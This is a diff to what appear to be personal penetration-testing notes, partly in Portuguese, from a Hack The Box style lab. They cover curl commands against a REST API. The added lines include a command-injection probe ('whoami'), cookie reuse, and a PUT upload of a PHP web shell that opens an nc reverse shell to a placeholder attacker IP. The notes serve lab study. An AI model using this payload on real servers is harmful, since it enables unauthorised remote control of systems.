@@ -14,4 +14,12 @@ curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City"
 curl -s http://<SERVER_IP>:<PORT>/api.php/city/HTB_City | jq
 curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json' <-- Esse metodo é utilizado para atualizar todos os dados 
 curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City <-- Comando para deletar uma entrada na API
-
+curl -X POST --data "code=whoami" http://<SERVER IP>:<PORT>/verify
+# List the methods allowed
+curl -X OPTIONS http://<SERVER IP> -v
+# Use cookie
+curl http://<SERVER IP> -b "JSESSIONID=cookievalue"
+#Exploiting PUT method
+# The PUT method is particularly dangerous. If you upload arbitrary files within the web root, the first target is to create a backdoor script on the server that will be executed by a server-side module,
+thereby giving the attacker full control of the application, and often the web server itself. For this example a will create a PHP reverse connection
+curl -X PUT -d '<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f"); ?>' [http://<SERVER IP>/test/reverse\_shell.php](http://<SERVER IP>/test/reverse%5C_shell.php) -v
